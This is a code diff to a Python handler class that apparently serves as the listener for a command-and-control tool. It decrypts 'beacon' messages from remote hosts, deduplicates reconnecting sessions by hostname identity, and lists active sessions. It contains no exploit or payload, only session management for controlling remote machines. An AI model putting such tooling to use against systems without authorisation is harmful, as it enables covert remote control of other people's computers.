@@ -29,6 +29,7 @@ class Handler:
         self.port = port
         self.key = key
         self.sessions = {}
+        self.by_identity = {}
         self.next_id = 1
         self.server = None
         self.running = False
@@ -53,6 +54,7 @@ class Handler:
             except Exception:
                 pass
         self.sessions.clear()
+        self.by_identity.clear()
         try:
             self.server.close()
         except Exception:
@@ -76,22 +78,49 @@ class Handler:
                         if not c:
                             raise ConnectionError("disconnected")
                         enc += c
-                    decrypt(self.key, enc)
+                    beacon_text = decrypt(self.key, enc).decode(errors="replace")
                 except Exception:
                     client.close()
                     continue
-                    client.close()
-                    continue
 
-                sid = self.next_id
-                self.next_id += 1
-                self.sessions[sid] = {"socket": client, "addr": addr, "alive": True}
-                print()
-                print(
-                    f" {_colorize('[+]', G)} New session "
-                    f"{_colorize(f'#{sid}', C)} from "
-                    f"{_colorize(f'{addr[0]}:{addr[1]}', Y)}"
-                )
+                parts = beacon_text.split("|")
+                if len(parts) >= 3 and parts[0] == "beacon":
+                    identity = f"{parts[1]}|{parts[2]}"
+                else:
+                    identity = f"{addr[0]}|beacon"
+
+                if identity in self.by_identity:
+                    sid = self.by_identity[identity]
+                    old = self.sessions[sid]
+                    try:
+                        old["socket"].close()
+                    except Exception:
+                        pass
+                    old["socket"] = client
+                    old["addr"] = addr
+                    old["alive"] = True
+                    print()
+                    print(
+                        f" {_colorize('[+]', G)} Session "
+                        f"{_colorize(f'#{sid}', C)} reconnected "
+                        f"({_colorize(parts[1], Y)})"
+                    )
+                else:
+                    sid = self.next_id
+                    self.next_id += 1
+                    self.by_identity[identity] = sid
+                    hostname = parts[1] if len(parts) >= 2 else addr[0]
+                    self.sessions[sid] = {
+                        "socket": client, "addr": addr, "alive": True,
+                        "hostname": hostname, "identity": identity,
+                    }
+                    print()
+                    print(
+                        f" {_colorize('[+]', G)} New session "
+                        f"{_colorize(f'#{sid}', C)} from "
+                        f"{_colorize(hostname, Y)} "
+                        f"({_colorize(addr[0], D)})"
+                    )
             except Exception:
                 break
 
@@ -138,19 +167,20 @@ class Handler:
             f'{alive} active', C)}"
         )
         print(
-            f" {D}{'ID':<5} {'Host':<20} {'Port':<8} {'Status':<10}{N}"
+            f" {D}{'ID':<5} {'Hostname':<18} {'Addr':<18} {'Status':<10}{N}"
         )
-        print(f" {D}{'-'*45}{N}")
+        print(f" {D}{'-'*55}{N}")
         for sid, session in sorted(self.sessions.items()):
             status = (
                 _colorize("Active", G)
                 if session["alive"]
                 else _colorize("Dead", R)
             )
+            hostname = session.get("hostname", session["addr"][0])
             print(
                 f" {_colorize(str(sid), C):<5} "
-                f"{session['addr'][0]:<20} "
-                f"{str(session['addr'][1]):<8} "
+                f"{_colorize(hostname, Y):<18} "
+                f"{session['addr'][0]:<18} "
                 f"{status}"
             )
         print()
